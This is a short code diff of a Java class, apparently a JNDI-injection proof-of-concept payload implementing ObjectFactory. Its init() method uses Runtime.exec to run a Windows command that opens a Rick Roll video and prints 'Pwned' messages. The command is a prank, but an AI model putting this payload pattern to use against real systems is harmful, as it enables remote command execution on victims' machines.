@@ -15,16 +15,14 @@ public class RickRoll implements javax.naming.spi.ObjectFactory {
     }
 
     public static void init() {
-        //cringe message
-        System.err.println("Pwned by itzbenz");
+        System.err.println("Pwned loooooo");
 
         try {
             Runtime.getRuntime().exec("cmd /c start http://www.youtube.com/watch?v=dQw4w9WgXcQ");
         } catch (IOException e) {
 
         }
-        //cringe message
-        System.out.println("Pwned by itzbenz");
+    
     }
 
     @Override
